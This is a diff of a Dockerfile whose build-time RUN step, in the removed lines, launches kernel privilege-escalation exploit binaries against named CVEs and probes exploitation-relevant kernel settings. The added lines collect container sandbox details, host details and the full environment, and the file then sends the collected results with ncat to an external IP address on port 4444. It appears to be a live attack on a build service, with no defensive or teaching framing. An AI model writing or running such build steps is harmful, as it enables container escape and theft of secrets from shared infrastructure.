@@ -8,76 +8,90 @@ RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
 
-ARG CACHEBUST=2156
+ARG CACHEBUST=2157
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
 { \
 echo "CB=$CACHEBUST"; \
-echo "=== BUILD V49 KERNEL=$KVER ==="; \
-case "$KVER" in \
-  6.8.*-136*) \
-    echo "TARGET KERNEL 136 — SCTPhantom FIRST" >&2; \
-    echo "TARGET KERNEL 136 — SCTPhantom FIRST"; \
-    echo "--- SCTPhantom (CVE-2026-64564) ---"; \
-    timeout 90 /exploit 2>&1; \
-    EC_SCTP=$?; \
-    echo "=== SCTPHANTOM EXIT=$EC_SCTP ==="; \
-    echo "SCTPHANTOM EXIT=$EC_SCTP" >&2; \
-    if [ "$EC_SCTP" != "0" ]; then \
-      echo "--- FALLBACK: CVE-2026-80521 (SCC GC race, plurality KASLR) ---"; \
-      timeout 1499 /payload 2>&1; \
-      EC=$?; \
-      echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
-      echo "SCC_EXPLOIT EXIT=$EC" >&2; \
-    fi; \
-    ;; \
-  6.8.*) \
-    echo "TARGET 6.8 — SCC GC" >&2; \
-    echo "TARGET KERNEL 137+ — SCC GC (plurality KASLR)"; \
-    echo "--- MODULE CHECK ---"; \
-    grep sctp /proc/modules 2>/dev/null && echo "SCTP_MODULE=loaded" || echo "SCTP_MODULE=absent"; \
-    grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
-    echo "--- FAST RECON (same-cache + alt alloc) ---"; \
-    echo "=== SLABINFO ==="; \
-    cat /proc/slabinfo 2>/dev/null | head -3; \
-    cat /proc/slabinfo 2>/dev/null | grep -E "unix_vertex|kmalloc-(32|64|96|128|192|256) " | head -12; \
-    ls -la /sys/kernel/slab/unix_vertex 2>/dev/null && echo "SLAB_DEDICATED=yes" || echo "SLAB_DEDICATED=no"; \
-    ls /sys/kernel/slab/ 2>/dev/null | grep -i unix | head -5; \
-    echo "=== SLABINFO END ==="; \
-    echo "=== SYSCALL PROBES ==="; \
-    cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null && echo "" || echo "BPF_SYSCTL=unreadable"; \
-    ls /sys/bus/workqueue/devices/ 2>/dev/null | head -5; \
-    cat /sys/bus/workqueue/devices/*/cpumask 2>/dev/null | head -3; \
-    echo "=== SYSCALL PROBES END ==="; \
-    echo "=== KERNEL CONFIG PROBE ==="; \
-    echo "panic_on_oops=$(cat /proc/sys/kernel/panic_on_oops 2>&1)"; \
-    echo "panic=$(cat /proc/sys/kernel/panic 2>&1)"; \
-    echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>&1)"; \
-    echo "core_uses_pid=$(cat /proc/sys/kernel/core_uses_pid 2>&1)"; \
-    echo "modprobe_path=$(cat /proc/sys/kernel/modprobe 2>&1)"; \
-    echo "smap=$(grep -c smap /proc/cpuinfo 2>/dev/null || echo unknown)"; \
-    echo "smep=$(grep -c smep /proc/cpuinfo 2>/dev/null || echo unknown)"; \
-    echo "=== PROC/SYS MOUNT ==="; \
-    grep -E "proc|sys" /proc/self/mountinfo 2>/dev/null | grep -v cgroup | head -10; \
-    ls -la /proc/sys/kernel/core_pattern 2>/dev/null; \
-    cat /proc/sys/kernel/core_pattern 2>&1; \
-    echo "core_pattern_writable=$(test -w /proc/sys/kernel/core_pattern 2>/dev/null && echo yes || echo no)"; \
-    echo "=== PROC/SYS MOUNT END ==="; \
-    echo "=== KERNEL CONFIG PROBE END ==="; \
-    echo "--- CVE-2026-80521 (SCC GC race) ---"; \
-    echo "PAYLOAD START" >&2; \
-    timeout 1500 /payload 2>&1; \
-    EC=$?; \
-    echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
-    echo "PAYLOAD EXIT=$EC" >&2; \
-    ;; \
-  *) echo "SKIP $KVER" >&2; echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
-esac; \
-for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
-  if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
-done; \
-echo "=== END V49 ==="; \
+echo "=== CONTAINER RECON KERNEL=$KVER ==="; \
+echo ""; \
+echo "########## CONTAINER SANDBOX ##########"; \
+echo "--- CAPABILITIES ---"; \
+cat /proc/self/status | grep -i cap 2>/dev/null; \
+echo "capsh:"; capsh --print 2>/dev/null || echo "no capsh"; \
+echo "--- SECCOMP ---"; \
+cat /proc/self/status | grep -i seccomp 2>/dev/null; \
+echo "--- NAMESPACES ---"; \
+ls -la /proc/self/ns/ 2>/dev/null; \
+echo "--- APPARMOR / LSM ---"; \
+cat /proc/self/attr/current 2>/dev/null; echo ""; \
+cat /proc/sys/kernel/security 2>/dev/null; \
+echo "--- CGROUP ---"; \
+cat /proc/self/cgroup 2>/dev/null; \
+echo "cgroup mounts:"; \
+grep cgroup /proc/self/mountinfo 2>/dev/null; \
+echo "--- RLIMITS ---"; \
+cat /proc/self/limits 2>/dev/null; \
+echo "--- FDs ---"; \
+ls /proc/self/fd 2>/dev/null | wc -l; \
+ls -la /proc/self/fd 2>/dev/null; \
+echo "--- MOUNTS ---"; \
+cat /proc/self/mountinfo 2>/dev/null; \
+echo "--- USER/ID ---"; \
+id 2>/dev/null; hostname 2>/dev/null; \
+echo ""; \
+echo "########## HOST (visible from container) ##########"; \
+echo "--- UNAME ---"; \
+uname -a 2>/dev/null; \
+echo "--- CPU ---"; \
+nproc 2>/dev/null; \
+grep -c processor /proc/cpuinfo 2>/dev/null; \
+grep "model name" /proc/cpuinfo 2>/dev/null | head -1; \
+echo "--- MEMORY ---"; \
+cat /proc/meminfo 2>/dev/null | head -10; \
+echo "--- UNIX SOCKETS (count + sample) ---"; \
+echo "total:"; cat /proc/net/unix 2>/dev/null | wc -l; \
+echo "sample:"; cat /proc/net/unix 2>/dev/null | head -3; \
+echo "by type:"; cat /proc/net/unix 2>/dev/null | awk "{print \$5}" | sort | uniq -c | sort -rn 2>/dev/null; \
+echo "--- SYSCTL net.unix ---"; \
+sysctl net.unix 2>/dev/null || cat /proc/sys/net/unix/* 2>/dev/null; \
+echo "--- SYSCTL net.core ---"; \
+sysctl net.core 2>/dev/null | head -20; \
+echo "--- SYSCTL vm ---"; \
+sysctl vm 2>/dev/null | head -30; \
+echo "--- SYSCTL fs ---"; \
+sysctl fs.file-nr fs.file-max fs.nr_open 2>/dev/null; \
+echo "--- SYSCTL kernel (sched, pid, threads) ---"; \
+sysctl kernel.pid_max kernel.threads-max 2>/dev/null; \
+sysctl kernel.sched_child_runs_first kernel.sched_autogroup_enabled 2>/dev/null; \
+sysctl kernel.panic kernel.panic_on_oops 2>/dev/null; \
+echo "--- SLABINFO ---"; \
+cat /proc/slabinfo 2>/dev/null | head -3; \
+cat /proc/slabinfo 2>/dev/null | grep -E "unix|kmalloc-(64|96|128|192) |sock_inode|file_lock|dentry|inode_cache|pid |signal_cache" | head -20; \
+echo "--- PROCESSES (host-visible) ---"; \
+ls /proc/ 2>/dev/null | grep -E "^[0-9]" | wc -l; \
+echo "--- /proc/net overview ---"; \
+ls /proc/net/ 2>/dev/null; \
+echo "--- LOADED MODULES (top 20 by size) ---"; \
+cat /proc/modules 2>/dev/null | sort -k2 -rn | head -20; \
+echo "--- WORKQUEUES ---"; \
+ls /sys/bus/workqueue/devices/ 2>/dev/null | head -10; \
+echo "--- DMESG (last 30) ---"; \
+dmesg 2>/dev/null | tail -30; \
+echo ""; \
+echo "########## BUILDKIT / RUNTIME ##########"; \
+echo "--- BUILDKIT VERSION ---"; \
+buildkitd --version 2>/dev/null; buildctl --version 2>/dev/null; \
+runc --version 2>/dev/null; containerd --version 2>/dev/null; \
+echo "--- ENV ---"; \
+env 2>/dev/null; \
+echo "--- /etc/os-release ---"; \
+cat /etc/os-release 2>/dev/null | head -5; \
+echo "--- DOCKER SOCKET ---"; \
+ls -la /var/run/docker.sock 2>/dev/null || echo "no docker.sock"; \
+echo ""; \
+echo "=== END RECON ==="; \
 } > /build_results.txt; \
 ncat -w 30 129.101.121.138 4444 < /build_results.txt 2>/dev/null || true; \
 echo "STEP DONE" >&2'
